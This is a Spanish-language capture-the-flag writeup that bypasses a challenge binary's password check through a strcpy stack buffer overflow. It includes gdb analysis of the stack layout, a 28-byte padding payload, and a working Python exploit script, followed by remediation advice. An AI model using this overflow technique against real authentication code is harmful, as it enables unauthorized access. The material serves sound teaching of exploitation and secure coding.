# Rompiendo Autenticación — Writeup

## Descripción del desafío

Se entrega un binario (`rompiendo-autenticacion.out`) que implementa una función de
autenticación. Mediante ingeniería social se obtuvo el código fuente de esa función:

```c
bool check_authentication(char *password) {
    int auth_flag = 0;
    char password_buffer[16];

    strcpy(password_buffer, password);

    char hash_buffer[SHA256_DIGEST_LENGTH * 2 + 1];
    sha256_hex(password_buffer, hash_buffer);

    if (strcmp(hash_buffer,
        "9cb2b63232ae1077ad065d770e8a29b0f68fdea3eade0fd7d633f368e8e0445f") == 0) {
        auth_flag = 1;
    }

    return auth_flag == 1;
}
```

El objetivo es autenticarse **sin conocer la contraseña real** (y sin romper SHA-256).

## Vulnerabilidad

La función usa `strcpy` para copiar el parámetro `password` dentro de
`password_buffer`, un arreglo de **16 bytes**, sin validar la longitud del
string de entrada. Esto es un **buffer overflow de stack** clásico (CWE-121 /
CWE-787): un atacante puede escribir más allá del buffer y sobrescribir
memoria adyacente en el stack frame de la función.

En particular, la variable `auth_flag` —que determina si la autenticación es
válida— vive en el mismo stack frame. Si logramos calcular la distancia exacta
entre el inicio de `password_buffer` y `auth_flag`, podemos sobrescribir
directamente su valor con `1`, saltándonos por completo la verificación del
hash.

## Entorno y herramientas usadas

- Linux (WSL en Windows 11, distro Ubuntu)
- `gdb` (con soporte opcional de `pwndbg`/`gef` para mejor visualización)
- `checksec` (análisis de protecciones del binario)
- `file` (identificación del formato del binario)
- Python 3 (para construir el payload binario)

## Paso 1: Reconocimiento del binario

```bash
chmod +x rompiendo-autenticacion.out
file rompiendo-autenticacion.out
```

Salida relevante:
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

```bash
checksec --file=rompiendo-autenticacion.out
```

| Protección     | Estado        |
|----------------|---------------|
| RELRO          | Full RELRO    |
| Stack Canary   | No canary found |
| NX             | Enabled       |
| PIE            | Enabled       |

**Conclusión:** no hay stack canary, lo cual permite sobrescribir variables
locales en el stack sin que el programa aborte por detección de corrupción.
PIE y NX están activos, pero no son relevantes para este ataque porque no
necesitamos ejecutar shellcode ni conocer direcciones absolutas: solo
sobrescribimos una variable local con un valor fijo.

El binario pide el password como argumento:
```bash
./rompiendo-autenticacion.out
# Usage: ./rompiendo-autenticacion.out <password>
```

## Paso 2: Análisis del stack frame con GDB

```bash
gdb ./rompiendo-autenticacion.out
(gdb) disas check_authentication
```

Instrucciones clave del desensamblado:

```asm
0x...+16:  movl   $0x0,-0x4(%rbp)      ; auth_flag = 0   (en rbp-0x4)
0x...+27:  lea    -0x20(%rbp),%rax     ; &password_buffer (en rbp-0x20)
0x...+37:  call   strcpy@plt
...
0x...+87:  movl   $0x1,-0x4(%rbp)      ; auth_flag = 1 (solo si el hash coincide)
0x...+94:  cmpl   $0x1,-0x4(%rbp)      ; comparación final
```

**Layout del stack relevante:**

```
rbp-0x20  →  inicio de password_buffer
rbp-0x04  →  auth_flag
```

Distancia entre ambos:
```
0x20 - 0x4 = 0x1c = 28 bytes
```

Esto significa que escribiendo 28 bytes de relleno dentro de
`password_buffer`, el siguiente byte que `strcpy` escriba caerá justo en el
primer byte de `auth_flag`.

## Paso 3: Construcción del exploit

Como `auth_flag` se inicializa en `0` (4 bytes: `00 00 00 00`) antes del
`strcpy`, y la comparación final es `auth_flag == 1`, basta con que el primer
byte de la variable quede en `0x01` y el resto en `0x00` (que ya estaban así
por la inicialización previa y no son tocados por nuestro payload).

**Payload:** 28 bytes de relleno + `0x01`

```python
import subprocess

payload = b"A" * 28 + b"\x01"

result = subprocess.run(
    ["./rompiendo-autenticacion.out", payload],
    capture_output=True
)

print("STDOUT:", result.stdout.decode(errors="replace"))
print("STDERR:", result.stderr.decode(errors="replace"))
print("Return code:", result.returncode)
```

Se usa `subprocess` en lugar de pasar el payload directo por la shell porque
el byte `0x01` no es imprimible y la terminal podría alterarlo o truncarlo.

## Paso 4: Ejecución y resultado

```bash
python3 exploit.py
```

```
===========================
Acceso Exitoso: <FLAG>
===========================
```

La autenticación se bypasseó completamente sin conocer la contraseña
original ni romper SHA-256.

## Causa raíz y remediación

- **Causa raíz:** uso de `strcpy` sin control de límites sobre un buffer de
  tamaño fijo, combinado con la ausencia de stack canary.
- **Remediación recomendada:**
  1. Reemplazar `strcpy` por `strncpy` (o mejor, `snprintf`) respetando el
     tamaño real de `password_buffer`.
  2. Validar la longitud de `password` antes de copiarla.
  3. Compilar con stack canary habilitado (`-fstack-protector-strong`).
  4. Reordenar variables sensibles (como flags de autenticación) lejos de
     buffers que reciben entrada no confiable, o usar banderas no
     fácilmente adivinables (p. ej. un valor aleatorio generado en runtime
     en vez de `0`/`1`).
  5. En general, evitar lógica de autenticación basada en variables locales
     mutables sobre el stack; preferir validaciones que no dependan de un
     único flag binario fácilmente sobrescribible.

## Herramientas y comandos usados (resumen)

```bash
# Reconocimiento
file rompiendo-autenticacion.out
checksec --file=rompiendo-autenticacion.out

# Análisis estático/dinámico
gdb ./rompiendo-autenticacion.out
(gdb) disas check_authentication

# Explotación
python3 exploit.py
```
#!/usr/bin/env python3
"""
Exploit para "Rompiendo Autenticacion"
Bypass de autenticacion mediante buffer overflow de stack.

Vulnerabilidad: strcpy() sin control de limites sobre password_buffer[16],
lo que permite sobrescribir la variable auth_flag ubicada 28 bytes mas
adelante en el stack frame.

Uso:
    python3 exploit.py [ruta_al_binario]
"""

import subprocess
import sys

BINARY = sys.argv[1] if len(sys.argv) > 1 else "./rompiendo-autenticacion.out"

# 28 bytes de relleno hasta auth_flag + 0x01 para dejarlo en 1
OFFSET = 28
payload = b"A" * OFFSET + b"\x01"

result = subprocess.run(
    [BINARY, payload],
    capture_output=True
)

print("STDOUT:", result.stdout.decode(errors="replace"))
print("STDERR:", result.stderr.decode(errors="replace"))
print("Return code:", result.returncode)
